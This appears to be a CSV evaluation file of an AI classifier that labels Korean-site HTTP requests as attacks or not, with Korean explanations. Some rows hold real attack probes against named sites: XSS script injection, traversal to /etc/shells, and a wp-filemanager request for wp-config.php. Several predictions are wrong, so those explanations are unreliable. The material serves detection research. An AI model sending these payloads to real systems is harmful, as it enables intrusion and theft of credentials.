Unnamed: 0,payload,label,code,CVE,cluster,pred,correct,result
108425,"HTTP/1.1 200 OK
P3P: policyref=""https://googleads.g.doubleclick.net/pagead/gcn_p3p_.xml"", CP=""CURa ADMa DEVa TAIo PSAo PSDo OUR IND UNI PUR INT DEM STA PRE COM NAV OTC NOI DSP COR""
Timing-Allow-Origin: *
Cross-Origin-Resource-Policy: cross-origin
Date: Wed, 03 May 2023 00:15:35 GMT
Pragma: no-cache
Expires: Fri, 01 Jan 1990 00:00:00 GMT
Cache-Control: no-cache, must-revalidate
Content-Type: text/javascript; charset=UTF-8
X-Content-Type-Options: nosniff
Content-Disposition: attachment; filename=""f.txt""
Content-Encoding: br
Server: cafe
Content-Length: 1284
X-XSS-Protection: 0
Set-Cookie: test_cookie=CheckForPermission; expires=Wed, 03-May-2023 00:30:35 GMT; path=/; domain=.doubleclick.net; Secure; SameSite=none
Alt-Svc: h3="":443""; ma=2592000,h3-29="":443""; ma=2592000

......./.E.j.......v.po..~zWEh..*[.._
<........r......v....\..b,XL-1.w.3..FS.vu.H.9....""-.w..!qK^^.?.,.I.,......A^'a..civ.^..MM..t$er.F
.J%-D......{...H.4..->|....j..0.|G.z.P}...<..w3{i.(.E.p.S..q....p..=.K,.\.......xo.
....n8,"".!C9).a.B.. .).X
..I..aK^s!8i.'..F.L.d..hROj-3.*.*. .qNXO8.....!./W9.
...X6.....(x..$!..E...1../...F..&9Px%...\c.?:...T...x^t%tr&h..E..3D..j
...rX.|..(.X&,....A+?
.%:.{...m.|!h..{.P....|.!/.S.........$.....!.1b.._c.7..u..WB1>K..P.A.x.\b./9..N2....g..3....~.9
...n@..G.dh<....(.`V..m..ZCO.......-..2.....",0,Not Attack,,38,0,True,"주어진 페이로드는 HTTP 응답 헤더의 일부분을 보여주고 있습니다. 이 페이로드는 공격을 나타내지 않습니다. 따라서 공격 여부를 0(비공격)으로 판단합니다.

해당 페이로드는 단순히 HTTP 응답 헤더 정보를 포함하고 있으며, 특이한 점이나 공격적인 요소는 보이지 않습니다. 주요 헤더 중 일부는 다음과 같습니다:
- P3P: 사이트가 사용자의 개인 정보를 수집하는 방식에 대한 권고 사항을 제공합니다.
- Timing-Allow-Origin: 리소스에 대한 접근을 허용하는 출처를 지정합니다.
- Cross-Origin-Resource-Policy: 다른 출처에서의 리소스 요청을 허용하는 정책을 설정합니다.
- Content-Type: 응답 본문의 미디어 타입을 지정합니다.
- Set-Cookie: 쿠키를 설정하여 클라이언트에게 전달합니다.

따라서 이 페이로드는 일반적인 HTTP 응답 정보를 포함하고 있으며 악의적인 공격을 나타내지 않습니다."
80814,"HTTP/1.1 302 
Location: https://webmail.unikorea.go.kr/resources/theme/securemail/bg.png
Content-Length: 0
Date: Thu, 31 Aug 2023 07:50:03 GMT
Keep-Alive: timeout=20
Connection: keep-alive
Server: Server

",0,Not Attack,,38,0,True,"주어진 정보는 HTTP 응답 헤더 정보로 이루어진 것이며, 특정 공격을 나타내는 것은 아닙니다. 따라서 이는 공격이 아니라고 판단되며, 공격 여부를 0(비공격)으로 판단합니다.

해당 페이로드는 HTTP 응답의 일부분으로 302 상태 코드를 포함하고 있습니다. 302 상태 코드는 리다이렉션을 의미하며, 클라이언트에게 새로운 위치로 이동하라는 지시를 전달합니다. 따라서 이 정보는 웹페이지의 리다이렉션을 위한 것으로, 공격적인 의도를 갖고 있는 것은 아닙니다."
79274,"HTTP /  1  .  1   2  0  0  OK  Transfer - Encoding :  chunked  Date :  Fri  COMMA    2  9  Sep  2  0  2  3   0  0  :  1  5  :  1  0  GMT  Access - Control - Allow - Origin :   *   Set - Cookie :  SCOUTER = z 5  8 qt 0  3 q 9 p 7  6  8  0  ;  Expires = Wed  COMMA    1  7  - Oct -  2  0  9  1   0  3  :  2  9  :  1  7  GMT ;  Path =  /   Connection :  keep - alive  Content - Type :  image / png ; charset = UTF -  8   Cache - Control :  public  COMMA   max - age =  2  5  9  2  0  0  0      5  9 f 5   PNG        IHDR              f  YIDATxWt g {  = n H    T @  2   9 s 9 k`sMvoEY  * Xs 5 VBkg >  m *  ~  @  : Wu /  % k -  *  .  % E ?  _ E '  %  }   5  { n ;  > A   > F 5 q :     * J   d  V    >   ' NVgl ojR ?    }   ~ M 5       gk  ?  9 s tS =  {  oO |  :  ] M 1  3  *  .  ) Q 7 l  ^ f   fnt  \  v ?  @  xw  } z | Mu qX | VAoT O { S 6 nVUuu W   vy    j   S 3 P  > q } T  5 je  >  } F |   - Nvl 5  | D + n  5 T _  } qpc 7  = C -   \  H }  ?  - w 3  vz  )  9 obbg /     8    / a  7 JLOW {  }   ; d  a  \   |  ^ UM ;  Z ~ iw | zl wl _ u {  { uu = yIk | rUoL |   \   =  _  ""  ` ( nr  : z 9   <   }   /  _  ~  D  m } Q : vNLKx MF .    @  -  >  |     < X -  ;  ~ RWIS _  u  : m oI 3  7    ^ bkpt | M $  W ; Qc m    =  ! WKnC ^   \   9 wujMoL o AUv t < o u w [  ? zLt 2  2  >   \  u Y  Ik  $  5 o .      \  pA % e T uQYS ~   _   %  =  / oF  s 2 UD 8 r ISE 8 A }   VMeeKT ~ c 9   COMMA  g  ~ ",0,Not Attack,,38,0,True,이 Payload는 HTTP 응답 메시지의 일부분으로 보입니다. 이는 이미지 파일(png)의 내용을 포함하고 있습니다. 따라서 이는 공격이 아닌 정상적인 HTTP 응답 메시지입니다. 따라서 공격 여부는 0(비공격)으로 판단됩니다.
37846,"GET /upload/faq.php?acuparam=%3E%22%3E%3CScRiPt%3Ealert(8924)%3C/ScRiPt%3E HTTP/1.1Host: www.cocoms.go.krUpgrade-Insecure-Requests: 1User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0)Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Language: en-US,en;q=0.9Connection: keep-alive",1,XSS,,39,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /upload/faq.php?acuparam=%3E%22%3E%3CScRiPt%3Ealert(8924)%3C/ScRiPt%3E HTTP/1.1
공격 유형 : Cross-Site Scripting (XSS)
이유 : URL 매개변수 'acuparam'에 악의적인 스크립트가 삽입되어 사용자의 브라우저에서 스크립트가 실행되도록 하는 XSS 공격이 시도되었습니다. 이 공격은 웹 애플리케이션의 취약점을 이용하여 사용자를 속이거나 개인 정보를 탈취하는 목적으로 사용될 수 있습니다."
47449,"GET /2022/inner.php?sMenu=login&backUrl=..%2F..%2F..%2Finner.php%3FsMenu%3DD5100%26amp%3Bmode%3Dview%26amp%3Bno%3D141 HTTP/1.0Connection: CloseReferer: http://www.wfac.or.kr/2022/inner.php?sMenu=D5100&mode=view&no=141Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Host: www.wfac.or.krUser-Agent: Mozilla/5.0 (compatible; heritrix/3.4.0-SNAPSHOT-2020-09-11T03:25:45Z +http://www.oasis.go.kr)Cookie: PHPSESSID=0as90562q4fg3le6blcnqlcvq7; cate=2022",0,Not Attack,,39,1,False,"주어진 정보를 토대로 분석한 결과, 주어진 Payload는 공격으로 간주됩니다.

공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /2022/inner.php?sMenu=login&backUrl=..%2F..%2F..%2Finner.php%3FsMenu%3DD5100%26amp%3Bmode%3Dview%26amp%3Bno%3D141 HTTP/1.0
공격 유형 : 이 Payload는 특정 웹페이지에 대한 GET 요청을 포함하고 있으며, backUrl 파라미터를 통해 상위 디렉토리로 이동하려는 시도가 있습니다. 이는 디렉토리 트래버설(경로 조작) 공격의 일종으로, 악의적인 사용자가 시스템에 대한 접근을 시도하는 행위로 해석될 수 있습니다."
52344,"GET /bshare_view?Callback=bShare.viewcb&url=http%3A%2F%2Fwww.earthsciencefrontiers.net.cn%2FEN%2F10.13745%2Fj.esf.2016.06.018&h=&uuid=&sc=1&l=17&lite=1&ref=https%3A%2F%2Fscholar.google.com%2F&ot=Ordovician%20tectonic%EE%80%91paleogeography%20in%20South%20China%20and%20chrono%EE%80%91%20and%20bio%EE%80%91stratigraphic%20division%20and%20correlation.&cs=UTF-8 HTTP/1.1
Host: bshare.optimix.cn
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: */*
Referer: http://www.earthsciencefrontiers.net.cn/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",0,Not Attack,,39,0,True,"해당 Payload는 HTTP GET 요청입니다. 이 요청은 bshare.optimix.cn 서버로 전송되며 특정 페이지의 정보를 가져오는 것으로 보입니다. User-Agent를 보면 일반적인 웹 브라우저처럼 보이지만, Referer 헤더에는 학술 사이트인 earthsciencefrontiers.net.cn이 포함되어 있습니다.

이 요청은 일반적인 사용자의 행위로 보이므로 공격이 아닌 것으로 판단됩니다. 따라서 공격 여부는 0(비공격)입니다."
51064,"GET /cckri/cmmn/downloadAttachFile.do?classCode=HPPRECEDE&classSeq=192&attachSeq=1&attachSaveName=20151029145119_dogbmglebsdnfxj.pdf HTTP/1.1
Host: ri.ccourt.go.kr
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36
Accept: */*

",0,Not Attack,,39,0,True,"이 요청은 HTTP GET 메서드를 사용하여 특정 파일을 다운로드하기 위한 요청입니다. 이 요청은 웹 서버에 특정 파일을 요청하고 있으며, Host 헤더를 통해 요청 대상 서버를 명시하고 있습니다. User-Agent 헤더는 클라이언트의 브라우저 및 운영 체제 정보를 제공하고 있습니다.

이 요청은 일반적인 파일 다운로드 요청으로 보여지며, 악의적인 행위로 해석하기에는 부족한 정보가 있습니다. 따라서 이 요청은 공격으로 판단되지 않으며, 공격 여부를 0(비공격)로 판단합니다."
4410,"GET /eng/films/index/filmsMore.jsp?movieCd=20124061&strMenuId=010601&title=Two%20Weddings%20and%20a%20Funeral%20%282012%29 HTTP/1.1\r\nHost: www.koreanfilm.or.kr\r\nAccept: text/html, application/rss+xml, application/atom+xml, text/xml, text/rss+xml, application/xhtml+xml\r\nAccept-Encoding: gzip,deflate\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",0,Not Attack,,39,0,True,"주어진 페이로드를 보면 HTTP GET 요청이 포함되어 있습니다. 이 요청은 정상적인 웹페이지 요청처럼 보이지만 User-Agent가 ""SemrushBot""으로 되어 있습니다. SemrushBot은 웹 크롤러로서 사이트를 스캔하거나 데이터를 수집할 때 사용될 수 있습니다. 따라서 이 요청은 크롤링 활동을 위한 것으로 판단되며 일반적인 공격은 아닙니다.

따라서 이 요청은 공격이 아니라고 판단되어 공격 여부를 0(비공격)으로 판단합니다."
42711,"GET /2016/inner.php?sMenu=login&backUrl=..%2F..%2F..%2Finner.php%3FsMenu%3DG3200%26amp%3Bmode%3Dview%26amp%3Bno%3D3 HTTP/1.0Connection: CloseReferer: http://www.jica.or.kr/2016/inner.php?sMenu=G3200&mode=view&no=3Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Host: www.jica.or.krUser-Agent: Mozilla/5.0 (compatible; heritrix/3.4.0-SNAPSHOT-2020-09-11T03:25:45Z +http://www.oasis.go.kr)Cookie: PHPSESSID=2gmirk428fm9b3p01hmf33epk6; cate=2016; JSESSIONID=F3898D0E746B84580C6880478F83D94A",0,Not Attack,,39,1,False,"주어진 Payload는 실제로 공격 페이로드인 것으로 보입니다.

공격 여부(0:비공격, 1:공격) : 1 (공격)
공격 구문 : GET /2016/inner.php?sMenu=login&backUrl=..%2F..%2F..%2Finner.php%3FsMenu%3DG3200%26amp%3Bmode%3Dview%26amp%3Bno%3D3 HTTP/1.0
공격 유형 : 이 Payload는 서버의 디렉토리 트래버설 공격(../)을 시도하고 있습니다. 이를 통해 공격자는 서버 상의 상위 디렉토리로 이동하여 민감한 파일에 접근하려는 시도를 하는 것으로 보입니다."
52243,"GET /openurl?sid=google&auinit=J&aulast=Li&atitle=A+biomimetic+nano+hybrid+coating+based+on+the+lotus+effect+and+its+anti-biofouling+behaviors&id=doi:10.1016/j.apsusc.2014.07.147&title=Applied+surface+science&volume=315&date=2014&spage=407&issn=0169-4332&authtype=ip,guest&groupid=main&profile=ftf&custid=s1033017 HTTP/1.1
Host: lps3.resolver.ebscohost.com.libra.cnu.ac.kr
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Safari/537.36 Edg/102.0.1245.41
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://libra.cnu.ac.kr/
Accept-Encoding: gzip, deflate
Accept-Language: ko,en;q=0.9,en-US;q=0.8,fr;q=0.7
Cookie: webauth=ug=7E36391631063D363E32370331&uc=1&am=IP&pg=; idp_marker=48e651ab-1f23-41e5-8b5b-26818afdbfd1; idp_marker=48e651ab-1f23-41e5-8b5b-26818afdbfd1; LIB3PRX_SESSID=87688087111121973196081939; LP1121SID=87688087111121973196081939; Max-Age=30; authContext=reqId=523200ef-ded5-4402-9555-74e1efa23028&prevReqId=; SToken=A1mTvNOLv_MTfUheRAE4RBeQo8QKV2tTeidDtE-gPowmK_UMsOOCZiVXxfPSCKqWOezI78W11gaSDP7qXy6NuqO0Nssxnoq2vQ-9_9yKBBuKRw1hDzwklvWfuPwDu2vTaqwhf4Q4TyV7_fgHR3pc4ti8N9UEXd8uRXPOLkS8NvOA9-fnDadESnqUiDhdAhIoG7wTLtA5lSbUV7UWbkhuh6OZ4ZoBPo10ASBKf8lHZ7yA_bYEfUhw3INc7M9yb1pNo1CI51eufCZ67IFEAYOdGFp6tdukQVA; expires=Mon, 20-",0,Not Attack,,39,0,True,"공격 여부(0:비공격, 1:공격) : 0
공격 구문 : 없음
공격 유형 : 이 요청은 단순히 특정 웹페이지의 정보를 요청하는 GET 방식의 HTTP 요청이므로 공격으로 분류되지 않습니다. 요청에는 특이한 점이 없고, 일반적인 웹페이지 요청과 동일한 형태를 가지고 있습니다."
124682,"GET /board/board_list?code=result&search_type=%22%3E HTTP/1.1
Host: 10.0.20.20
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/10.0.20.20 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6,zh-CN;q=0.5,zh;q=0.4
Cookie: designart_site=f7324uemqrekpmivtft4iu0esl93ss7r",1,XSS,,39,-1,False,"주어진 페이로드는 GET 요청으로 ""/board/board_list"" 경로에 쿼리스트링을 이용하여 ""code=result""와 ""search_type=%22%3E""를 전송하고 있습니다. 이 부분에서 ""search_type=%22%3E""에서 ""%22%3E""는 URL 인코딩된 값으로 ""%22""은 큰따옴표를 나타내고, ""%3E""는 HTML에서의 큰 부등호(>)를 나타냅니다. 이는 큰 부등호(>)를 검색 조건으로 사용하려는 시도로 해석될 수 있습니다.

따라서, 이 요청은 공격으로 분류될 수 있습니다. 공격 구문은 ""search_type=%22%3E""이며, 공격 유형은 HTML 인젝션으로 분류될 수 있습니다. HTML 인젝션은 사용자의 입력값을 그대로 웹 페이지에 반영할 때 발생할 수 있는 취약점으로, 악의적인 스크립트를 삽입하여 사용자의 정보를 탈취하거나 특정 동작을 유도할 수 있습니다."
124745,"GET /sub_04_5.php?search=123%22%3E%3Ch1%3ETEST%3C/h1%3E HTTP/1.1
Host: 10.0.20.20
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/10.0.20.20 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6,zh-CN;q=0.5,zh;q=0.4
Cookie: PHPSESSID=5fbg2hojk8k2jaf2o37ssasgju",1,XSS,,39,1,True,"주어진 Payload를 분석해보겠습니다.

주어진 Payload는 HTTP GET 요청입니다. 요청된 URL은 `/sub_04_5.php?search=123%22%3E%3Ch1%3ETEST%3C/h1%3E`이고, 이는 '123""><h1>TEST</h1>'라는 검색어를 URL에 인코딩하여 전달하고 있습니다. 이는 일반적인 검색어가 아니라 HTML 태그가 포함된 문자열이므로, 이를 삽입 공격(SQL Injection, XSS 등)으로 해석할 수 있습니다.

따라서 이 요청은 공격으로 판단될 수 있습니다. 공격 여부를 1(공격)으로 판단하며, 공격 구문은 URL 파라미터에 HTML 태그가 포함된 것이며, 공격 유형은 XSS(Cross-Site Scripting) 공격으로 분류될 수 있습니다. 이유는 악의적인 사용자가 해당 사이트에 악성 스크립트를 삽입하여 사용자의 쿠키 정보를 탈취하거나 다른 공격을 수행할 수 있는 가능성이 있기 때문입니다."
43678,"GET /html/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1Cookie: JSESSIONID=9bkm1-6hnnKvhkHsc9laHFL5P2DL_VdWqThWk1aT.independenceAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: gzip,deflate,brUser-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)Host: www.nlcy.go.kr:8080Connection: Keep-alive",1,PT,,39,1,True,"해당 Payload는 Directory Traversal(디렉터리 탐색) 공격을 시도하는 것으로 판단됩니다. 

- 공격 여부(0:비공격, 1:공격) : 1 (공격)
- 공격 구문 : GET /html/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
- 공격 유형 : 디렉터리 탐색(Directory Traversal) 공격은 웹 서버의 디렉터리 구조를 이용하여 웹 서버에 존재하는 파일들을 불법적으로 읽어오는 공격입니다. 이를 통해 시스템 정보나 중요한 파일들에 접근하여 보안에 심각한 위협을 가할 수 있습니다.
"
51740,"GET /action/FileDownLoad.jsp?NP_DataCode=20000011&NGB_Code=10001760&NP_Code=10000040&fileFlag=1&fileName=%C7%D0%BC%FA%BF%F8%C5%EB%BD%C5%20254%C8%A3.pdf&fileSaveName=%C7%D0%BC%FA%BF%F8%C5%EB%BD%C5%20254%C8%A31.pdf HTTP/1.1
Host: www.nas.go.kr
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.30
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://www.nas.go.kr/data/report/list.jsp?NP_Code=10000040&NP_DataCode=20000011&searchKey=NGB_SUBJECT&searchVal=&pg=9
Accept-Encoding: gzip, deflate
Accept-Language: ko,en;q=0.9,en-US;q=0.8
Cookie: JSESSIONID=E48E2D9A856A45AF4F80ACAF8893DE8C

",0,Not Attack,,39,0,True,"주어진 페이로드는 HTTP GET 요청을 보내는 것으로 보입니다. 이 요청은 정상적인 파일 다운로드를 요청하는 것으로 보이며, Host 헤더를 통해 www.nas.go.kr 서버로 요청을 보내고 있습니다. User-Agent 헤더는 브라우저 정보를 포함하고 있습니다.

따라서, 이 요청은 공격이 아니라고 판단되며, 공격 여부를 0(비공격)으로 판단합니다."
13398,"GET /eng/films/index/filmsView.jsp?userId=&peopleCd=&strMenuId=010401&category=ALL&mode=INDEX_FILMS_LIST&searchKeyword=hide%20and%20seek&pageIndex=1'[0]&searchType=ALL&movieCd=20136049&s_genre=ALL&pageRowSize=10 HTTP/1.1\nAccept: Text/Html,Application/Xhtml Xml,Application/Xml;Q=0.9,*/*;Q=0.8\nConnection: keep-alive\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Rv:50.0) Gecko/20100101 Firefox/50.0\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip\nCookie: JSESSIONID=7A10A9AF51BD43AB0977C2C97CD67339\nHost: www.koreanfilm.or.kr",0,Not Attack,,39,-1,False,"해당 페이로드는 URL을 통한 HTTP 요청이 포함되어 있습니다. 이는 보통 웹 애플리케이션에서 사용자가 입력한 데이터를 서버로 전달하는 방식으로, 보통은 공격으로 이용되지 않습니다. 따라서 이 페이로드는 공격으로 분류되지 않습니다."
16766,"GET /mail2/downloadAttach.do?fileId=muid%3D1343412%26email%3Danbr0305%40kcopa.or.kr%26offset%3D4474%26length%3D122622%26filename%3D147%20PAR%2020_21%20-%20April%207%20-%20Safety%20and%20Precautions%20-%20A%20Message%20from%20ASB%20Chairman.pdf%26encoding%3Dbase64&filename=147%20PAR%2020_21%20-%20April%207%20-%20Safety%20and%20Precautions%20-%20A%20Message%20from%20ASB%20Chairman.pdf HTTP/1.1\r\nHost: gw.kcopa.or.kr\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferer: http://gw.kcopa.or.kr/mail2/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ko,en;q=0.9,en-US;q=0.8\r\nCookie: _ga=GA1.3.938782388.1581050217; saveid=anbr0305; 202013_noticePopId_4543=no; 202013_noticePopId_4551=no; 202013_noticePopId_4555=no; 202013_noticePopId_4583=no; 202013_noticePopId_4606=no; 202013_noticePopId_4679=no; _INSIGHT_CK_1154=0ae1bc0617b38130e66c257cb0d1e338_50221|a534a7087b4f2173229eb700aa682e58_05263:1617607771000; JSESSIONID=1A5A8DD3BCD83426356B1DEA4905E95D\r\nX-Forwarded-For: 171.97.203.107\r\nCache-Control: max-stale=0\r\nConnection: Keep-Alive",0,Not Attack,,39,0,True,"주어진 Payload는 HTTP GET 요청을 나타내는 것으로 보입니다. 해당 요청은 서버에서 특정 파일을 다운로드하는 것으로 보이며, Host는 gw.kcopa.or.kr입니다. User-Agent 헤더에는 일반적인 웹 브라우저의 정보가 포함되어 있습니다.

이 요청은 일반적인 파일 다운로드 요청으로 보이며, 악의적인 의도가 없어 보입니다. 따라서 이 요청은 공격이 아니라고 판단되어 공격 여부를 0(비공격)으로 판단합니다."
51579,"GET /cckri/cmmn/downloadAttachFile.do?classCode=HPPRECEDE&classSeq=138&attachSeq=2&attachSaveName=20141226161642_uvvijohlijnqgsv.pdf HTTP/1.1
Accept: text/html, application/xhtml+xml, */*
Accept-Language: ko-KR
User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
Accept-Encoding: gzip, deflate
Host: ri.ccourt.go.kr
Connection: Keep-Alive
Cookie: JSESSIONID=R71szEcKK1DNIpipq6zGePPQEfq0VrklZipaXwodfecDO0wbpVimNd1FcPsv6KNa.amV1c19DQ09VUlQvY2Nrcmk=; XTVID=A2111111726426853; XTR_SESSIONID=A2111111726426855

",0,Not Attack,,39,0,True,"주어진 Payload는 HTTP GET 요청입니다. 이 요청은 특정 웹 서버의 파일 다운로드를 요청하는 것으로 보입니다. 주어진 정보만으로는 공격 여부를 명확히 결정할 수 없지만, 주어진 내용만으로는 일반적인 파일 다운로드 요청으로 보이므로 공격으로 판단되지 않습니다.

따라서,

- 공격 여부 : 0 (비공격)
- 공격 구문 : 해당 없음
- 공격 유형 : 해당 없음"
51555,"GET /wp-content/plugins/wp-filemanager/incl/libfile.php?&path=..%2F..%2F..%2F..%2F&filename=wp-config.php&action=download HTTP/1.1\nHost: urimal365.kr\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate",1,FD,,39,1,True,"주어진 Payload를 분석해보겠습니다.

1. 공격 여부(0:비공격, 1:공격) : 1 (공격)

2. 공격 구문 : GET /wp-content/plugins/wp-filemanager/incl/libfile.php?&path=..%2F..%2F..%2F..%2F&filename=wp-config.php&action=download HTTP/1.1

3. 공격 유형 : Path Traversal(경로 조작) 공격
   - 이 Payload는 wp-filemanager 플러그인을 통해 서버의 wp-config.php 파일을 다운로드하려는 시도를 보여줍니다. path 매개변수에 %2F(슬래시)를 사용하여 서버 파일 시스템의 상위 디렉토리로 이동을 시도하고 있습니다. 이는 경로 조작 공격의 전형적인 예시입니다. 이를 통해 공격자는 민감한 정보가 담긴 wp-config.php 파일을 유출하거나 악의적인 목적으로 활용할 수 있습니다."
36519,"GET /ap/ch/tpt/javascript:getBusInfoDetail(4773) HTTP/1.1
Host: www.airport.kr
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: Close
User-Agent: Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)
Accept-Language: en;q=0.9,zh-CN,zh;q=0.1
Accept-Encoding: gzip, deflate",0,Not Attack,,39,1,False,"주어진 Payload는 공격으로 간주될 수 있습니다. 이 Payload는 웹 서버에 대한 HTTP GET 요청을 나타내며, 특정 JavaScript 함수를 호출하고 있습니다. 이는 서버 측에서 실행되는 코드를 호출하는 시도로 해석될 수 있습니다. 따라서 이러한 유형의 요청은 보안에 취약할 수 있으며, 악의적인 목적으로 사용될 가능성이 있습니다.

따라서 이 Payload는 공격으로 분류되며, 공격 여부를 1(공격)로 판단합니다."
